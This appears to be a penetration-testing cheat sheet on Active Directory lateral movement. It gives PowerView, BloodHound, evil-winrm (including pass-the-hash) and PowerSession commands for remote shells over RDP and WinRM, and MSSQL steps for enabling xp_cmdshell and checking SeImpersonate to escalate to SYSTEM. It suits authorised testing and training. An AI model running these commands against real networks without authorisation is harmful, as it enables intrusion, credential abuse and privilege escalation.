## Remote Desktop Access

When to use: Foothold established but local admin is missing; checking for jump host placement or access to sensitive data via RDS.

Check members of the local Remote Desktop Users group via PowerView

```
Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Desktop Users"
```

Tool comparison:

- BloodHound -> Find Workstations/Servers where Domain Users can RDP -> High-speed identification of broad RDP permissions across the domain
- xfreerdp -> `xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP>` -> Primary Linux-based CLI client
- mstsc.exe -> `mstsc /v:<TARGET_IP>` -> Native Windows client

Gotchas: **Domain Users group** often has broad RDP rights on RDS or jump hosts by design.

## WinRM Enumeration and Shell

When to use: Targeting hosts where specific users or groups have "Remote Management Users" membership or `CanPSRemote` edges in BloodHound.

Enumerate the Remote Management Users group via PowerView

```
Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Management Users"
```

Search BloodHound for all users with WinRM execution rights

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf *1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote* 1..]->(c:Computer) RETURN p2
```

Establish a session from a Windows host using valid credentials

```
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $password)
Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
```

Connect from a Linux host using valid credentials

```
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

Tool comparison:

- evil-winrm -> `evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>` -> Prefer from Linux; supports Pass-the-Hash and automated script loading
- Enter-PSSession -> `Enter-PSSession -ComputerName <TARGET_IP> -Credential <CRED>` -> Native Windows method; use when attacking from a Windows pivot

Gotchas: **Ruby limitations** may break remote path completion in evil-winrm.

## MSSQL Administrative Access

When to use: Credentials recovered from config files (web.config) or Kerberoasting; check BloodHound for `SQLAdmin` edges.

Identify SQL instances within the domain

```
Get-SQLInstanceDomain
```

Execute a version check query against a remote instance via PowerUpSQL

```
Get-SQLQuery -Instance "<TARGET_IP>,<PORT>" -username "<DOMAIN>\<USERNAME>" -password "<PASSWORD>" -query 'Select @@version'
```

Authenticate to SQL server from Linux using Windows authentication

```
mssqlclient.py <DOMAIN>/<USERNAME>@<TARGET_IP> -windows-auth
```

Enable OS command execution after obtaining a SQL shell

```
enable_xp_cmdshell
```

Execute system commands to verify privileges and check for SeImpersonate

```
xp_cmdshell whoami /priv
```

Dangerous / misconfigured settings:

- **SeImpersonatePrivilege** enabled for the SQL service account allows immediate escalation to SYSTEM via Potato-style exploits

Gotchas: **xp_cmdshell** requires manual activation via `enable_xp_cmdshell` before OS commands function; this configuration change is often logged.